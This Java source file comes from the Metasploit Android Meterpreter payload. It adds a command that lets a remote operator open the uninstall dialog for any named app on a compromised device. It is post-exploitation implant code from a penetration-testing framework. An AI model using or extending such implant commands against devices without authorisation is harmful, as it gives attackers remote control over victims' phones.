package com.metasploit.meterpreter.android;

import android.content.Context;
import android.os.PowerManager;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.util.List;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class corrm_app_uninstall implements Command {
    private static final int TLV_EXTENSIONS                = 20000;
    private static final int TLV_TYPE_APP_PACKAGE_NAME     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2913);
    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        // AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        // final Context context = androidMeterpreter.getContext();

        String PackageName = request.getStringValue(TLV_TYPE_APP_PACKAGE_NAME);

        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + PackageName));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

        // return ERROR_FAILURE;
        return ERROR_SUCCESS;
    }
}